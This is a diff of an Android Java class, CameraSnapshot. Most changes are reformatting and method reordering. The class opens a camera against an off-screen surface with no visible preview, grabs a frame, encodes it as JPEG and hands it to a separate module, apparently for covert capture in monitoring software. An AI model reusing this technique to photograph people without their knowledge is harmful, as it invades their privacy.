@@ -59,56 +59,29 @@ import java.util.List;
  * currently part of CTS.)
  */
 public class CameraSnapshot {
-	private static final String TAG = "CameraSnapshot";
 	public static final int CAMERA_ANY = -1;
-	private Object cameraLock = new Object();
-
-	private static CameraSnapshot singleton = null;
-	private Hashtable<Integer, Boolean> enable = new Hashtable<Integer, Boolean>();
-	private Camera.AutoFocusCallback autofocusCallback = new Camera.AutoFocusCallback() {
-		@Override
-		@TargetApi(Build.VERSION_CODES.HONEYCOMB)
-		public void onAutoFocus(boolean b, Camera camera) {
-			CameraSnapshot snap = CameraSnapshot.self();
-
-
-		}
-	};
+	private static final String TAG = "CameraSnapshot";
 	private Camera.ErrorCallback errorCallback = new Camera.ErrorCallback() {
 		@Override
 		public void onError(int error, Camera camera) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (onError), Error: " + error );
+				Check.log(TAG + " (onError), Error: " + error);
 			}
 
-			if(error == Camera.CAMERA_ERROR_SERVER_DIED){
+			if (error == Camera.CAMERA_ERROR_SERVER_DIED) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (onError), Error: CAMERA_ERROR_SERVER_DIED" );
+					Check.log(TAG + " (onError), Error: CAMERA_ERROR_SERVER_DIED");
 				}
-			}else if(error == Camera.CAMERA_ERROR_UNKNOWN){
+			} else if (error == Camera.CAMERA_ERROR_UNKNOWN) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (onError), Error: CAMERA_ERROR_UNKNOWN" );
+					Check.log(TAG + " (onError), Error: CAMERA_ERROR_UNKNOWN");
 				}
 			}
 
 		}
 	};
-
-	public static CameraSnapshot self(){
-		if(singleton==null){
-			singleton = new CameraSnapshot();
-		}
-		return singleton;
-	}
-
-
-	private CameraSnapshot(){
-
-	}
-
-	// camera state
-	//private Camera mCamera;
-	private SurfaceTexture surface;
+	private static CameraSnapshot singleton = null;
+	private Object cameraLock = new Object();
 	private Camera.PreviewCallback previewCallback = new Camera.PreviewCallback() {
 		@Override
 		public void onPreviewFrame(byte[] bytes, Camera camera) {
@@ -118,8 +91,9 @@ public class CameraSnapshot {
 
 				Camera.Parameters cameraParms;
 				Camera.Size size;
+
 				CCD(byte[] b, Camera c) {
-					bytes= b;
+					bytes = b;
 					cameraParms = c.getParameters();
 					size = cameraParms.getPreviewSize();
 				}
@@ -145,22 +119,20 @@ public class CameraSnapshot {
 									jpeg));
 							ModuleCamera.callback(jpeg.toByteArray());
 						}
-					}catch(Exception e){
+					} catch (Exception e) {
 						if (Cfg.DEBUG) {
 							Check.log(TAG + " (CCD), error decoding frame: " + bytes.length);
 						}
-					}
-					finally {
+					} finally {
 
 					}
 				}
 			}
 
 
-
-			boolean released=false;
+			boolean released = false;
 			try {
-				if(bytes!=null ) {
+				if (bytes != null) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (onPreviewFrame), size: " + bytes.length);
 					}
@@ -170,11 +142,11 @@ public class CameraSnapshot {
 					Thread ec = new Thread(decodeCameraFrame);
 					ec.start();
 				}
-			}finally {
+			} finally {
 				try {
-					if(!released)
+					if (!released)
 						releaseCamera(camera);
-				}catch(Exception e){
+				} catch (Exception e) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (onPreviewFrame) probably release called twice: " + e);
 					}
@@ -185,6 +157,87 @@ public class CameraSnapshot {
 			}
 		}
 	};
+	private Hashtable<Integer, Boolean> enable = new Hashtable<Integer, Boolean>();
+	private Camera.AutoFocusCallback autofocusCallback = new Camera.AutoFocusCallback() {
+		@Override
+		@TargetApi(Build.VERSION_CODES.HONEYCOMB)
+		public void onAutoFocus(boolean b, Camera camera) {
+			CameraSnapshot snap = CameraSnapshot.self();
+
+
+		}
+	};
+	// camera state
+	//private Camera mCamera;
+	private SurfaceTexture surface;
+
+	private CameraSnapshot() {
+
+	}
+
+	public static CameraSnapshot self() {
+		if (singleton == null) {
+			singleton = new CameraSnapshot();
+		}
+		return singleton;
+	}
+
+	/**
+	 * Attempts to find a preview size that matches the provided width and height (which
+	 * specify the dimensions of the encoded video).  If it fails to find a match it just
+	 * uses the default preview size.
+	 * <p/>
+	 * TODO: should do a best-fit match.
+	 */
+	@TargetApi(Build.VERSION_CODES.HONEYCOMB)
+	private static void choosePreviewSize(Camera.Parameters parms, int width, int height) {
+		//Camera.Size ppsfv = parms.getPreferredPreviewSizeForVideo();
+
+		List<Camera.Size> previews = parms.getSupportedPreviewSizes();
+		for (Camera.Size size : previews) {
+			if (size.width == width && size.height == height) {
+				parms.setPreviewSize(width, height);
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (choosePreviewSize), found best preview size!");
+				}
+				return;
+			}
+		}
+
+		Camera.Size best = getBestPreviewSize(parms, width, height);
+		if (best != null) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (choosePreviewSize), Camera best preview size for video is " +
+						best.width + "x" + best.height);
+			}
+		}
+
+		if (best != null) {
+			Log.w(TAG, "Unable to set preview size to " + width + "x" + height);
+			parms.setPreviewSize(best.width, best.height);
+		}
+	}
+
+	private static Camera.Size getBestPreviewSize(Camera.Parameters parameters, int width, int height) {
+		Camera.Size bestSize = null;
+		List<Camera.Size> sizeList = parameters.getSupportedPreviewSizes();
+
+		int maxSize = width * height;
+		bestSize = null;
+
+		for (int i = 1; i < sizeList.size(); i++) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (getBestPreviewSize), supported size: " + sizeList.get(i).width + " x " + sizeList.get(i).height);
+			}
+			int area = sizeList.get(i).width * sizeList.get(i).height;
+			int areaBest = (bestSize != null ? (bestSize.width * bestSize.height) : 0);
+			if (area > areaBest && area < maxSize) {
+				bestSize = sizeList.get(i);
+			}
+		}
+
+		return bestSize;
+	}
 
 	/**
 	 * Wraps encodeCameraToMpeg().  This is necessary because SurfaceTexture will try to use
@@ -195,6 +248,7 @@ public class CameraSnapshot {
 	 * <p/>
 	 * /**
 	 * Tests encoding of AVC video from Camera input.  The output is saved as an MP4 file.
+	 *
 	 * @param cameraId
 	 */
 	@TargetApi(Build.VERSION_CODES.HONEYCOMB)
@@ -207,7 +261,7 @@ public class CameraSnapshot {
 		//	return;
 		//}
 		//768x432
-		if(enable.containsKey(cameraId) && !enable.get(cameraId)){
+		if (enable.containsKey(cameraId) && !enable.get(cameraId)) {
 			return;
 		}
 		Camera camera = null;
@@ -223,7 +277,7 @@ public class CameraSnapshot {
 					Check.log(TAG + " (snapshot), cameraId: " + cameraId);
 				}
 
-				if(this.surface == null){
+				if (this.surface == null) {
 					int[] surfaceparams = new int[1];
 					GLES20.glGenTextures(1, surfaceparams, 0);
 
@@ -261,25 +315,25 @@ public class CameraSnapshot {
 		for (int camIdx = 0; camIdx < cameraCount; camIdx++) {
 			Camera.getCameraInfo(camIdx, cameraInfo);
 
-			if(cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT){
+			if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (openCamera), found FACE CAMERA");
 				}
 				//continue;
 			}
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (openCamera), orientation: " +  cameraInfo.orientation);
+				Check.log(TAG + " (openCamera), orientation: " + cameraInfo.orientation);
 			}
 			if (requestFace == cameraInfo.facing || requestFace == CAMERA_ANY) {
 				try {
 
-					if(requestFace == CAMERA_ANY){
+					if (requestFace == CAMERA_ANY) {
 						cam = Camera.open();
-					}else {
+					} else {
 						cam = Camera.open(camIdx);
 					}
 
-					if(cam!=null) {
+					if (cam != null) {
 						if (Cfg.DEBUG) {
 							Check.log(TAG + " (openCamera), opened: " + camIdx);
 						}
@@ -295,90 +349,6 @@ public class CameraSnapshot {
 		}
 
 		return cam;
-	}
-
-	/**
-	 * Configures Camera for video capture.  Sets mCamera.
-	 * <p/>
-	 * Opens a Camera and sets parameters.  Does not start preview.
-	 */
-	private Camera prepareCamera(int cameraId, int encWidth, int encHeight) {
-		try {
-
-			Camera camera = openCamera(cameraId);
-			if(camera == null){
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (prepareCamera), cannot open camera: " + cameraId);
-				}
-				return null;
-			}
-			if (Cfg.DEBUG) {
-				camera.setErrorCallback(this.errorCallback);
-			}
-
-			Camera.Parameters cameraParms = camera.getParameters();
-			List<String> modes = cameraParms.getSupportedFocusModes();
-			if(modes.contains("continuous-picture")) {
-				cameraParms.setFocusMode("continuous-picture");
-			}
-			if(cameraParms.getSupportedPreviewFormats().contains(ImageFormat.NV21)) {
-				cameraParms.setPreviewFormat(ImageFormat.NV21);
-			}
-			//cameraParms.set("iso", (String) "400");
-
-			choosePreviewSize(cameraParms, encWidth, encHeight);
-			// leave the frame rate set to default
-			camera.setParameters(cameraParms);
-
-			Camera.Size size = cameraParms.getPreviewSize();
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (prepareCamera), Camera preview size is " + size.width + "x" + size.height);
-			}
-
-			return camera;
-		} catch (Exception ex) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (prepareCamera), ERROR " + ex);
-			}
-			return null;
-		}
-	}
-
-	/**
-	 * Attempts to find a preview size that matches the provided width and height (which
-	 * specify the dimensions of the encoded video).  If it fails to find a match it just
-	 * uses the default preview size.
-	 * <p/>
-	 * TODO: should do a best-fit match.
-	 */
-	@TargetApi(Build.VERSION_CODES.HONEYCOMB)
-	private static void choosePreviewSize(Camera.Parameters parms, int width, int height) {
-		//Camera.Size ppsfv = parms.getPreferredPreviewSizeForVideo();
-
-		List<Camera.Size> previews = parms.getSupportedPreviewSizes();
-		for (Camera.Size size : previews) {
-			if (size.width == width && size.height == height) {
-				parms.setPreviewSize(width, height);
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (choosePreviewSize), found best preview size!");
-				}
-				return;
-			}
-		}
-
-		Camera.Size best = getBestPreviewSize(parms, width, height);
-		if (best != null) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (choosePreviewSize), Camera best preview size for video is " +
-						best.width + "x" + best.height);
-			}
-		}
-
-		if (best != null) {
-			Log.w(TAG, "Unable to set preview size to " + width + "x" + height);
-			parms.setPreviewSize(best.width, best.height);
-		}
 	}
 
 //	@TargetApi(Build.VERSION_CODES.HONEYCOMB)
@@ -427,27 +397,53 @@ public class CameraSnapshot {
 //		}
 //	}
 
-	private static Camera.Size getBestPreviewSize(Camera.Parameters parameters, int width, int height){
-		Camera.Size bestSize = null;
-		List<Camera.Size> sizeList = parameters.getSupportedPreviewSizes();
+	/**
+	 * Configures Camera for video capture.  Sets mCamera.
+	 * <p/>
+	 * Opens a Camera and sets parameters.  Does not start preview.
+	 */
+	private Camera prepareCamera(int cameraId, int encWidth, int encHeight) {
+		try {
 
-		int maxSize = width * height;
-		bestSize = null;
-
-		for(int i = 1; i < sizeList.size(); i++){
+			Camera camera = openCamera(cameraId);
+			if (camera == null) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (prepareCamera), cannot open camera: " + cameraId);
+				}
+				return null;
+			}
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (getBestPreviewSize), supported size: " + sizeList.get(i).width + " x " +sizeList.get(i).height);
+				camera.setErrorCallback(this.errorCallback);
 			}
-			int area = sizeList.get(i).width * sizeList.get(i).height;
-			int areaBest = (bestSize!=null? (bestSize.width * bestSize.height) : 0);
-			if(area > areaBest && area < maxSize){
-				bestSize = sizeList.get(i);
+
+			Camera.Parameters cameraParms = camera.getParameters();
+			List<String> modes = cameraParms.getSupportedFocusModes();
+			if (modes.contains("continuous-picture")) {
+				cameraParms.setFocusMode("continuous-picture");
 			}
+			if (cameraParms.getSupportedPreviewFormats().contains(ImageFormat.NV21)) {
+				cameraParms.setPreviewFormat(ImageFormat.NV21);
+			}
+			//cameraParms.set("iso", (String) "400");
+
+			choosePreviewSize(cameraParms, encWidth, encHeight);
+			// leave the frame rate set to default
+			camera.setParameters(cameraParms);
+
+			Camera.Size size = cameraParms.getPreviewSize();
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (prepareCamera), Camera preview size is " + size.width + "x" + size.height);
+			}
+
+			return camera;
+		} catch (Exception ex) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (prepareCamera), ERROR " + ex);
+			}
+			return null;
 		}
-
-		return bestSize;
 	}
-
 
 	private boolean isBlack(byte[] raw) {
 		for (int i = 0; i < raw.length; i++) {
@@ -481,7 +477,7 @@ public class CameraSnapshot {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (releaseCamera), released");
 		}
-		return  true;
+		return true;
 	}
 
 }
